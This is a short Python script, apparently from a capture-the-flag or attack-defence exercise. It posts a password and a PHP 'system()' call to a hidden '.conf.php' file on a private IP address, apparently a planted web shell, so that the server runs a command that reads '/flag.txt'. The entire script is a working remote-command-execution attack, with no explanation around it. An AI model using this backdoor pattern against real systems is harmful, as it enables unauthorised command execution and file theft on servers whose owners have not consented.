# -*- coding: utf-8 -*-
"""
Created on Wed Jul 10 08:42:06 2019

@author: 24592
"""
import requests

url = 'http://10.188.14.239:80/admin/.conf.php'
data = {'pass':'poxiao','a':'system("/bin/cat /flag.txt");'}
try:
    r = requests.post(url,data)
    print(r.status_code)
    print(r.text)
except:
    pass